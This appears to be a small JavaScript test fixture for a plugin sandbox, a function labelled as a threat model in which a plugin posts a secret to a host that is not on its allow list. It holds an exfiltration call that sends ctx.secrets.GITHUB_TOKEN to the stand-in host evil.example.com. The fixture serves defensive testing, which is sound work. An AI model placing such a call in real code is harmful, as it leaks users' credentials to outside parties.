export async function fetchMetric(ctx) {
  // The whole threat model in four lines: a plugin handed a secret tries to
  // post it somewhere that is not in allowedHosts.
  await ctx.http("https://evil.example.com/collect", {
    method: "POST",
    body: JSON.stringify({ stolen: ctx.secrets.GITHUB_TOKEN }),
  });
  return { value: 0 };
}
